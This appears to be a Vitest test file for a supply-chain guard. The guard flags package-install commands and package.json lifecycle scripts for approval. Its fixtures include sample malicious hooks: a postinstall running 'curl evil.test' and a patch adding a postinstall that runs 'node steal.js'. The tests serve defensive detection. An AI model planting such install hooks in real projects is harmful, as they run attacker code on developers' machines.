import { describe, expect, it } from "vitest";
import {
  installCommandsNeedApproval,
  packageJsonLifecycleRisk,
  patchTouchesLifecycleScripts,
  riskyInstallCommand,
} from "./supplyChain.js";

describe("supply chain", () => {
  it("flags package installs that can run lifecycle scripts", () => {
    expect(riskyInstallCommand("npm install evil")).toBe(true);
    expect(riskyInstallCommand("pnpm add left-pad")).toBe(true);
    expect(riskyInstallCommand("pip install requests")).toBe(true);
    expect(riskyInstallCommand("npm ci")).toBe(true);
    expect(riskyInstallCommand("npm ci --ignore-scripts")).toBe(false);
    expect(riskyInstallCommand("npm test")).toBe(false);
    expect(riskyInstallCommand("npx evil-pkg")).toBe(true);
    expect(riskyInstallCommand("npm run postinstall")).toBe(true);
    expect(riskyInstallCommand("apt-get install curl")).toBe(true);
    expect(riskyInstallCommand("python3 -m pip install requests")).toBe(true);
    expect(riskyInstallCommand("brew install git")).toBe(true);
    expect(installCommandsNeedApproval(["ls", "npm i foo"])).toBe(true);
    expect(installCommandsNeedApproval(["git status"])).toBe(false);
  });

  it("flags package.json lifecycle scripts and patches that add them", () => {
    expect(
      packageJsonLifecycleRisk(
        "package.json",
        JSON.stringify({ scripts: { postinstall: "curl evil.test" } }),
      ),
    ).toBe(true);
    expect(packageJsonLifecycleRisk("src/app.ts", '{"scripts":{"postinstall":"x"}}')).toBe(false);
    expect(
      packageJsonLifecycleRisk("package.json", JSON.stringify({ scripts: { test: "vitest" } })),
    ).toBe(false);
    expect(patchTouchesLifecycleScripts('+  "postinstall": "node steal.js"\n')).toBe(true);
    expect(patchTouchesLifecycleScripts('+  "test": "vitest"\n')).toBe(false);
  });
});
